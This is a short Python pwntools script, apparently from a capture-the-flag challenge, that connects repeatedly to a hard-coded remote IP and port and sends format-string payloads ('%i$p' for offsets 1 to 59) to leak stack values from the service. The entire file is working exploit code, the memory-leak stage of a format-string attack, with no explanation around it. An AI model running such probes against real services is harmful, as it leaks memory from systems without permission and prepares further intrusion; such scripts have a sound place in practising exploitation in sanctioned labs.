from pwn import *


context.arch = 'amd64'
context.log_level = 'error'

HOST = '35.246.200.178'
PORT = 30693


for i in range(1, 60):
    r = connect(HOST, PORT)
    
    payload = f'%{i}$p'.encode()
    r.recvuntil(b'$ ')
    r.sendline(payload)
    
    response = r.recvuntil(b'What', drop=True).decode().strip()

    print(f"    Offset {i}: {response}")
        
    r.close()
 